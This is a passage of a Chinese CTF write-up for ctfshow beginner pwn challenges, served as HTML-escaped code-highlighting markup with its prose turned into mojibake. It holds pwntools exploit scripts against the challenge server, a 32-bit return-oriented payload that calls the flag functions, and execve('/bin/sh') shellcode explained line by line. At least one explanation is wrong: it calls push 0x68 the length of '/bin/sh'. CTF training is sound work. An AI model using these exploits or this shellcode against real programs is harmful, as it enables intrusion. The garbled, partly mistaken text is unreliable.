&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;remote&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;pwn.challenge.ctf.show&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;28207&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;flag_func1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;elf&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sym&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;flag_func1&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;flag_func2&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;elf&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sym&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;flag_func2&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;flag&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;elf&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sym&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;flag&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cyclic&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x2c&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;flag_func1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;flag_func2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;flag&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0xACACACAC&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0xBDBDBDBD&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recvuntil&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Input your flag: &amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;interactive&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;blockquote&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cyclic&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x2c&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;flag_func1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;flag_func2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;flag&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0xACACACAC&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0xBDBDBDBD&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;è¿™é‡Œä½ æƒ³å¿…æŠŠæœ‰ç‚¹æ‡µï¼Œä¸ºä»€ä¹ˆè¦å…ˆflagå†åˆ°å‚æ•°ï¼Œä¸æ˜¯åº”è¯¥å…ˆæ‰§è¡Œå®Œå‡½æ•°ã€ä¼ å®Œå‚å†åˆ°å¦å¤–ä¸€ä¸ªå‡½æ•°å—ï¼Ÿæ„Ÿè§‰å¾ˆä¹±å•Š&amp;hellip;.&lt;/p&gt;
&lt;p&gt;32 ä½ç¨‹åºè°ƒç”¨å‡½æ•°æ—¶ï¼Œéµå¾ªä¸¤ä¸ªå…³é”®è§„åˆ™ï¼ˆè¿™æ˜¯ç†è§£ payload çš„å‰æï¼‰ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;å‚æ•°å‹æ ˆé¡ºåº&lt;/strong&gt;ï¼šå‡½æ•°çš„å‚æ•°è¦æŒ‰ â€œä»å³åˆ°å·¦â€ çš„é¡ºåºï¼Œä¾æ¬¡æ”¾åˆ°æ ˆä¸Šï¼›&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;è¿”å›åœ°å€è·Ÿç€å‚æ•°&lt;/strong&gt;ï¼šå‚æ•°å‹å®Œåï¼Œè¦å‹å…¥ â€œå‡½æ•°æ‰§è¡Œå®Œåè¦è·³è½¬åˆ°çš„åœ°å€â€ï¼ˆå³ä¸‹ä¸€ä¸ªå‡½æ•°çš„åœ°å€ï¼‰ï¼Œæœ€åæ‰æ˜¯ â€œå½“å‰è¦è°ƒç”¨çš„å‡½æ•°åœ°å€â€ã€‚&lt;/li&gt;
&lt;/ol&gt;&lt;/blockquote&gt;
&lt;p&gt;ç°åœ¨è¿™äº›é¢˜ç›®éœ€è¦æˆ‘ä»¬å¯¹ä»£ç å…·æœ‰ä¸€å®šé˜…è¯»ç†è§£èƒ½åŠ›ï¼Œç†è§£ä»£ç çš„è¿ä½œåŸç†ï¼Œè€Œä¸å†åƒæ–°æ‰‹å…¥é—¨é‚£æ ·æ— è„‘å¥—ret2shellcodeã€ret2libcã€è„šæœ¬äº†ã€‚&lt;/p&gt;
&lt;h3 id=&#34;è®¤è¯†32ä½å’Œ64ä½çš„shellcode&#34;&gt;è®¤è¯†32ä½å’Œ64ä½çš„shellcode
&lt;/h3&gt;&lt;h3 id=&#34;pwn_056&#34;&gt;PWN_056
&lt;/h3&gt;&lt;p&gt;é¢˜ç›®ï¼šå…ˆäº†è§£ä¸€ä¸‹ç®€å•çš„32ä½shellcodeå§ã€‚ &lt;a class=&#34;link&#34; href=&#34;PWN_056&#34; &gt;PWN_056&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;IDA32åˆ†æï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/196.png&#34;
	width=&#34;934&#34;
	height=&#34;216&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/196_hu_ae51ca9a6dc8f358.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/196_hu_7869cf41786bb51c.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;startå‡½æ•°&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;432&#34;
		data-flex-basis=&#34;1037px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;è¿™é‡Œå°±æ˜¯é€åˆ†çš„äº†ï¼ŒæŠŠ/bin/shèµ‹å€¼ç»™v1ï¼Œç„¶åè°ƒç”¨execveå‡½æ•°ï¼ˆç±»ä¼¼systemå‡½æ•°ï¼‰å»æ‰§è¡Œï¼Œè¿™ä¸å°±æ˜¯ç›´æ¥ç»ˆç«¯äº¤äº’å—ï¼Ÿ&lt;/p&gt;
&lt;p&gt;expï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;pwn&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;context&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;arch&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;i386&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;os&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;linux&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;log_level&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;debug&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;elf&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ELF&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;./pwn&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;remote&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;pwn.challenge.ctf.show&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;28189&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;interactive&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;ç°åœ¨æ¥çœ‹æ±‡ç¼–è¯­è¨€ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;push&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x68&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;push&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x732f2f2f&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;push&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x6e69622f&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;ebx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;esp&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;xor&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;ecx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;ecx&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;xor&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;edx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;edx&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;push&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0xB&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;pop&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;eax&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x80&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;è¿™æ®µä»£ç æ˜¯x86æ±‡ç¼–è¯­è¨€çš„ä»£ç ï¼Œç”¨äºåœ¨Linuxç³»ç»Ÿä¸Šæ‰§è¡Œä¸€ä¸ªç³»ç»Ÿè°ƒç”¨æ¥æ‰§è¡Œ&lt;code&gt;execve(&amp;quot;/bin/sh&amp;quot;, NULL, NULL) &lt;/code&gt;ã€‚è®©æˆ‘ä»¬é€è¡Œè§£æä»£ç çš„åŠŸèƒ½ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;push&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x68&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;è¿™è¡Œä»£ç å°†åå…­è¿›åˆ¶å€¼ 0x68 ï¼ˆ104çš„åè¿›åˆ¶è¡¨ç¤ºï¼‰å‹å…¥æ ˆä¸­ã€‚è¿™æ˜¯ä¸ºäº†å°†åç»­çš„å­—ç¬¦ä¸² &amp;ldquo;/bin/sh&amp;quot;çš„é•¿åº¦ï¼ˆ11ä¸ªå­—ç¬¦ï¼‰æ”¾å…¥æ ˆä¸­ï¼Œä»¥ä¾¿åç»­ä½¿ç”¨ã€‚&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;push&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x732f2f2f&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;è¿™è¡Œä»£ç å°†åå…­è¿›åˆ¶å€¼ 0x732f2f2f å‹å…¥æ ˆä¸­ã€‚è¿™æ˜¯å­—ç¬¦ä¸² &amp;ldquo;/bin/sh&amp;rdquo; çš„å‰åŠéƒ¨åˆ†å­—ç¬¦çš„é€†åºè¡¨ç¤ºï¼Œå³ &amp;ldquo;sh//&amp;quot;ã€‚è¿™æ˜¯å› ä¸ºx86æ¶æ„æ˜¯å°ç«¯å­—èŠ‚åºçš„ï¼Œå­—ç¬¦ä¸²éœ€è¦ä»¥é€†åºæ–¹å¼å­˜å‚¨åœ¨å†…å­˜ä¸­ã€‚ï¼ˆä½†å…¶å®2f2få¯ä»¥æ¢æˆ0000ï¼Œè¡¥ç©ºä½ï¼Œé‚£å°±æ˜¯0x732f0000ï¼šshï¼Œä¸è¦//éƒ½å¯ä»¥çš„ï¼‰&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;push&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x6e69622f&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;è¿™è¡Œä»£ç å°†åå…­è¿›åˆ¶å€¼ 0x6e69622f å‹å…¥æ ˆä¸­ã€‚è¿™æ˜¯å­—ç¬¦ä¸² &amp;ldquo;/bin/sh&amp;rdquo; çš„ååŠéƒ¨åˆ†å­—ç¬¦çš„é€†åºè¡¨ç¤ºï¼Œå³ &amp;ldquo;/bin&amp;rdquo;ã€‚&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;ebx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;esp&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;è¿™è¡Œä»£ç å°†æ ˆé¡¶çš„åœ°å€ï¼ˆå³å­—ç¬¦ä¸² &amp;ldquo;/bin/sh&amp;rdquo; çš„èµ·å§‹åœ°å€ï¼‰å¤åˆ¶ç»™å¯„å­˜å™¨ ebx ã€‚ ebx å¯„å­˜å™¨å°†ç”¨ä½œ&lt;code&gt;execve&lt;/code&gt; ç³»ç»Ÿè°ƒç”¨çš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œå³è¦æ‰§è¡Œçš„å¯æ‰§è¡Œæ–‡ä»¶çš„è·¯å¾„ã€‚&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
